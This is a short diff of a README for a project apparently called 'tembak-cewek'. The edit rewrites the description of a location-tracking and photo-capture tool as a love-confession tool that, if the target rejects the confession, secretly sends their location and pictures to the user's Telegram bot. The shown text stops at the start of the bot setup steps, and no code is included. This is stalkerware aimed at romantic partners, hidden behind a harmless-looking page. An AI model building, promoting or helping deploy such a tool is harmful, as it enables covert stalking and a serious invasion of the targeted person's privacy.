@@ -1,5 +1,5 @@
 # tembak-cewek
-Took for tracking location and get pictures, 
+Tool for express your love to girlfriend or boyfriend, but if they reject your love, you will get their location and pictures on your telegram bot. 
 
 ## Preparing Telegram Bot
 1. Go to your telegram
